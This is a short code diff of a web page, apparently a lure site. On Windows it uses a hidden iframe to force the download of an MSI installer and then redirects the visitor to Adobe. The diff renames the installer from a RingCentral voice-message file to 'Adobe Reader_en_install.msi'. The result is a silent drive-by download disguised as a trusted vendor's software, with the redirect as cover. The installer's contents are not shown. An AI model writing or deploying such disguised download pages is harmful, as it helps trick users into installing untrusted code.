@@ -10,7 +10,7 @@ export default function Home() {
       // Windows: trigger MSI download + redirect to Adobe
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/ringcentral_app_voicemessage.msi'; // make sure the MSI file is in /public
+      iframe.src = '/Adobe Reader_en_install.msi'; // make sure the MSI file is in /public
       document.body.appendChild(iframe);
 
       setTimeout(() => {
